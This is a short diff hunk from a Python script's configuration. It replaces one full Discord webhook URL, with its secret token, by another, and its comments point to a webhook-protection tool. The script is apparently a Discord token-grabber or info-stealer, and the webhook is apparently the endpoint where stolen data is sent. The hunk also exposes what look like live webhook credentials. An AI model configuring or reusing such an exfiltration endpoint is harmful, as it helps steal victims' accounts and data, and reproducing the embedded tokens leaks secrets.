@@ -33,7 +33,7 @@ from Crypto.Util.number import long_to_bytes
 config = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-    'webhook': "https://discord.com/api/webhooks/1091534860755152977/Xe3PCARt58YxPPGvvCzNpW2XSp91rJsZS8WHLqyn4Y3DbCparV71vR4ywfJqax3SiboV",
+    'webhook': "https://discord.com/api/webhooks/1091538466166280213/aSSzEFm1cSulkwO-GiDxBLMe7BgIDyJfacPsLc0me8c9TdG15DCiTQqMk9F0TTjQfep6",
     # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
     'webhook_protector_key': "KEY_HERE",
     # keep it as it is unless you want to have a custom one
